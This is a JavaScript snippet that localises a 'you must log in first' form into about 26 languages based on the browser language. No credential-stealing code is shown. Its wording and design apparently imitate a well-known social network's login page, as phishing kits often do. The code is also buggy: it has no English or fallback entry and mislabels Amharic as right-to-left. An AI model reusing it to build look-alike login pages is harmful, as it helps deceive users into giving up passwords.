transItems = document.querySelectorAll(".translated");
var userLang = (navigator.language || navigator.userLanguage).split('-')[0];
var Translate = {
	ar: {
		dir: 'rtl',
		main: 'يجب تسجيل الدخول اولا',
		user: 'عنوان البريد الإلكتروني أو رقم الهاتف',
		pass: 'كلمه السر',
		button: 'تسجيل دخول',
		or: 'او',
		create: 'انشاء حساب جديد'
	},

	mn: {
		dir: 'ltr',
		main: 'Та эхлээд нэвтрэх хэрэгтэй.',
		user: 'Гар утасны дугаар эсвэл имэйл хаяг',
		pass: 'нууц үг',
		button: 'Нэвтрэх',
		or: 'эсвэл',
		create: 'Шинэ данс үүсгэх'
	},

	es: {
		dir: 'ltr',
		main: 'Primero debe iniciar sesión.',
		user: 'Número de móvil o dirección de correo electrónico',
		pass: 'clave',
		button: 'Iniciar sesión',
		or: 'o',
		create: 'Crear una nueva cuenta'

	},
	am: {
		dir: 'rtl',
		main: 'መጀመሪያ መግባት አለብህ።',
		user: 'የሞባይል ቁጥር ወይም ኢሜል አድራሻ',
		pass: 'ፕስወርድ',
		button: 'ግባ',
		or: 'ወይም',
		create: 'አዲስ መለያ ፍጠር'


	},
	bg: {
		dir: 'ltr',
		main: 'Първо трябва да влезете.',
		user: 'Имейл адрес или мобилен номер',
		pass: 'парола',
		button: 'Влизам',
		or: 'или',
		create: 'Създаване на нов акаунт'

	},
	bn: {
		dir: 'ltr',
		main: 'প্রথমে আপনাকে প্রবেশ করতে হবে.',
		user: 'ইমেল ঠিকানা বা মোবাইল নম্বর',
		pass: 'পাসওয়ার্ড',
		button: 'প্রবেশ করুন',
		or: 'বা',
		create: 'নতুন অ্যাকাউন্ট তৈরি'

	},
	cs: {
		dir: 'ltr',
		main: 'Nejprve se musíte přihlásit.',
		user: 'E-mailová adresa nebo mobilní číslo',
		pass: 'Heslo',
		button: 'Přihlásit se',
		or: 'nebo',
		create: 'Vytvořit nový účet'

	},
	el: {
		dir: 'ltr',
		main: 'Πρέπει πρώτα να συνδεθείτε.',
		user: 'Διεύθυνση email ή αριθμός κινητού τηλεφώνου',
		pass: 'Κωδικός πρόσβασης',
		button: 'Σύνδεση',
		or: 'ή',
		create: 'Δημιουργία νέου λογαριασμού'

	},
	fi: {
		dir: 'ltr',
		main: 'Sinun on ensin kirjauduttava sisään.',
		user: 'Sähköpostiosoite tai matkapuhelinnumero',
		pass: 'Salasana',
		button: 'Kirjaudu sisään',
		or: 'tai',
		create: 'Luo uusi tili'

	},
	fr: {
		dir: 'ltr',
		main: "Tu dois d'abord te connecter.",
		user: 'Adresse e-mail ou numéro de portable',
		pass: 'Mot de passe',
		button: 'Connexion',
		or: 'ou',
		create: 'Créer un nouveau compte'

	},
	he: {
		dir: 'rtl',
		main: 'אתה צריך להתחבר תחילה.',
		user: 'כתובת אימייל או מספר טלפון',
		pass: 'סיסמה',
		button: 'התחברות',
		or: 'אוֹ',
		create: 'ליצור חשבון חדש'

	},
	hi: {
		dir: 'ltr',
		main: 'आपको पहले लॉग इन करने की जरूरत है।',
		user: 'विद्युत डाक पता या मोबाइल नंबर',
		pass: 'पासवर्ड',
		button: 'लॉग इन करें',
		or: 'या',
		create: 'नया खाता बनाएँ'

	},
	hu: {
		dir: 'ltr',
		main: 'Először be kell jelentkeznie.',
		user: 'E-mail cím vagy mobilszám',
		pass: 'Jelszó',
		button: 'Belépés',
		or: 'vagy',
		create: 'Új fiók létrehozása'

	},
	id: {
		dir: 'ltr',
		main: 'Anda harus login terlebih dahulu.',
		user: 'Alamat email atau nomor ponsel',
		pass: 'Kata sandi',
		button: 'Gabung',
		or: 'atau',
		create: 'Buat akun baru'

	},
	it: {
		dir: 'ltr',
		main: 'Devi prima effettuare il login.',
		user: 'Indirizzo email o numero di cellulare',
		pass: "Parola d'ordine",
		button: 'Accedere',
		or: 'o',
		create: 'Crea un nuovo account'

	},
	my: {
		dir: 'ltr',
		main: 'သင် ဦးစွာဝင်ရောက်ရန် လိုအပ်ပါသည်။',
		user: 'အီးမေးလ်လိပ်စာ သို့မဟုတ် မိုဘိုင်းနံပါတ်',
		pass: 'စကားဝှက်',
		button: 'လော့ဂ်အင်',
		or: 'သို့မဟုတ်',
		create: 'အကောင့်အသစ်ဖန်တီးပါ။'

	},
	ne: {
		dir: 'ltr',
		main: 'तपाईंले पहिले लगइन गर्न आवश्यक छ।',
		user: 'इमेल ठेगाना वा मोबाइल नम्बर',
		pass: 'पासवर्ड',
		button: 'लग - इन',
		or: 'वा',
		create: 'नयाँ खाता सिर्जना गर्नुहोस्'

	},
	ph: {
		dir: 'ltr',
		main: 'Kailangan mo munang mag-login.',
		user: 'Email address o Mobile number',
		pass: 'Password',
		button: 'Mag log in',
		or: 'o',
		create: 'Lumikha ng Bagong Account'

	},
	pl: {
		dir: 'ltr',
		main: 'Musisz się najpierw zalogować.',
		user: 'Adres email czy numer telefonu',
		pass: 'Hasło',
		button: 'Zaloguj sie',
		or: 'lub',
		create: 'Stwórz nowe konto'

	},
	pt: {
		dir: 'ltr',
		main: 'Você precisa fazer o login primeiro.',
		user: 'Endereço de email ou número de celular',
		pass: 'Senha',
		button: 'Conecte-se',
		or: 'ou',
		create: 'Criar nova conta'

	},
	ro: {
		dir: 'ltr',
		main: 'Mai întâi trebuie să vă autentificați.',
		user: 'Adresă de e-mail sau număr de telefon',
		pass: 'Parola',
		button: 'Log in',
		or: 'sau',
		create: 'Creează un cont nou'

	},
	sw: {
		dir: 'ltr',
		main: 'Unahitaji kuingia kwanza.',
		user: 'Anwani ya barua pepe au nambari ya rununu',
		pass: 'Nenosiri',
		button: 'Ingia',
		or: 'au',
		create: 'Fungua Akaunti Mpya'

	},
	th: {
		dir: 'ltr',
		main: 'คุณต้องเข้าสู่ระบบก่อน',
		user: 'ที่อยู่อีเมลหรือหมายเลขโทรศัพท์มือถือ',
		pass: 'รหัสผ่าน',
		button: 'เข้าสู่ระบบ',
		or: 'หรือ',
		create: 'สร้างบัญชีใหม่'

	},
	tr: {
		dir: 'ltr',
		main: 'Önce oturum açmanız gerekir.',
		user: 'E-posta adresi veya cep telefonu numarası',
		pass: 'Parola',
		button: 'Giriş yapmak',
		or: 'veya',
		create: 'Yeni hesap oluştur'

	},
	ur: {
		dir: 'rtl',
		main: 'آپ کو پہلے لاگ ان کرنے کی ضرورت ہے۔',
		user: 'ای میل ایڈریس یا موبائل نمبر',
		pass: 'پاس ورڈ',
		button: 'لاگ ان کریں',
		or: 'یا',
		create: 'نیا اکاؤنٹ بنانے'
	},
	vi: {
		dir: 'ltr',
		main: 'Bạn cần phải đăng nhập đầu tiên.',
		user: 'Địa chỉ email hoặc số điện thoại di động',
		pass: 'Mật khẩu',
		button: 'Đăng nhập',
		or: 'hoặc',
		create: 'Tạo tài khoản mới'

	}
};


transItems[0].style.direction = Translate[userLang].dir;
transItems[1].innerHTML = Translate[userLang].main;
transItems[2].setAttribute("placeholder", Translate[userLang].user);
transItems[3].setAttribute("placeholder", Translate[userLang].pass);
transItems[4].value = Translate[userLang].button;
transItems[5].innerHTML = Translate[userLang].or;
transItems[6].innerHTML = Translate[userLang].create;